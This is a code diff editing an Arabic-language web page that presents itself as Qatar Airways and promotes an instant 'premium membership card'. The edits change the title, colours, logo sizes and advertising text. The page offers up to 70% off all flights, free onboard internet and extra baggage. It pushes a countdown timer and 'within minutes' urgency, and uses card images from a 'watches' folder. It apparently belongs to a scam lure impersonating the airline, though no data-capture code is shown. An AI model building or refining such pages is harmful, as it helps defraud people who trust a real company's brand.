@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الخطوط الجوية القطرية - بطاقة العضوية المميزة</title>
+    <title>الخطوط الجوية القطرية - بطاقة العضوية الحصرية</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --qatar-maroon: #5C0632;
@@ -56,7 +56,7 @@
             border-radius: 2px;
         }
         .header-left img {
-            height: 38px;
+            height: 50px; /* Increased size */
             object-fit: contain;
             display: block;
         }
@@ -71,7 +71,7 @@
         }
         
         .main-container {
-            margin-top: 62px;
+            margin-top: 74px;
             width: 100%;
         }
         .banner-video {
@@ -200,6 +200,7 @@
             display: flex;
             flex-direction: column;
             text-align: right;
+            flex-grow: 1;
         }
 
         .compact-title {
@@ -241,7 +242,7 @@
             position: relative;
         }
 
-        .promo-left {
+        .promo-right {
             display: flex;
             flex-direction: column;
             gap: 5px;
@@ -304,7 +305,7 @@
         }
 
         footer {
-            background-color: #000000;
+            background-color: #808080; /* Gray Footer */
             color: #ffffff;
             padding: 40px 20px;
             margin-top: 40px;
@@ -315,22 +316,23 @@
             text-align: center;
         }
         .footer-logo {
-            height: 35px;
+            height: 45px;
             margin-bottom: 20px;
-            filter: brightness(0) invert(1);
+            filter: brightness(0) invert(1); /* Keep white logo on gray */
+            display: inline-block;
         }
         .footer-info {
             font-size: 13px;
             line-height: 1.8;
-            color: #ccc;
+            color: #eee;
         }
         .footer-bottom {
             margin-top: 20px;
-            border-top: 1px solid rgba(255,255,255,0.1);
+            border-top: 1px solid rgba(255,255,255,0.2);
             padding-top: 15px;
             text-align: center;
             font-size: 11px;
-            color: #bbb;
+            color: #ddd;
         }
         
         @media (max-width: 768px) {
@@ -362,7 +364,7 @@
             <img src="images/qatar_airways/logo.png" alt="الخطوط الجوية القطرية">
         </div>
         <div class="header-right">
-            <a href="data-en.html" class="lang-btn">English</a>
+            <a href="index-en.html" class="lang-btn">English</a>
         </div>
     </header>
 
@@ -374,16 +376,16 @@
         <div class="content-section">
             <div class="card-showcase">
                 <div class="card-promo-large">
-                    <img src="images/watches/card1.png" alt="بطاقة الخطوط الجوية القطرية المميزة">
+                    <img src="images/watches/card1.png" alt="البطاقة القطرية المميزة">
                 </div>
-                <h2 class="card-showcase-title">بطاقة مميزة من الخطوط الجوية القطرية</h2>
-                <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمزايا التي لا تنتهي</p>
+                <h2 class="card-showcase-title">البطاقة القطرية المميزة</h2>
+                <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمميزات لا ينتهي</p>
                 
                 <div class="card-benefits-list">
-                    <div class="benefit-item"><i class="fas fa-check-circle"></i> يمكنك الحجز والسفر في نفس اليوم</div>
-                    <div class="benefit-item"><i class="fas fa-check-circle"></i> إنترنت مجاني فائق السرعة على متن الطائرة</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> إمكانية الحجز والسفر في نفس اليوم</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> إنترنت مجاني عالي السرعة على متن الطائرة</div>
                     <div class="benefit-item"><i class="fas fa-check-circle"></i> وزن إضافي للأمتعة مجاناً</div>
-                    <div class="benefit-item"><i class="fas fa-check-circle"></i> أولوية تامة في إنهاء إجراءات الحجز</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> أولوية كاملة في إجراءات الحجز</div>
                     <div class="benefit-item"><i class="fas fa-check-circle"></i> خصم يصل إلى 70% على جميع الرحلات</div>
                 </div>
 
@@ -429,9 +431,9 @@
             </div>
             
             <div class="promo-banner">
-                <div class="promo-left">
+                <div class="promo-right">
                     <div class="promo-title">لطلب بطاقتك الآن</div>
-                    <div class="promo-subtitle">وخلال دقائق!</div>
+                    <div class="promo-subtitle">وخلال دقائق فقط!</div>
                 </div>
                 
                 <div class="promo-timer-box">
@@ -449,7 +451,7 @@
                     </div>
                     <div class="promo-feature-item">
                         <div class="promo-feature-icon"><i class="fas fa-wifi"></i></div>
-                        <span class="promo-feature-text">ادفع بسهولة<br>وفي أي مكان</span>
+                        <span class="promo-feature-text">ادفع بسهولة<br>في أي مكان</span>
                     </div>
                     <div class="promo-feature-item">
                         <div class="promo-feature-icon"><i class="fas fa-star"></i></div>
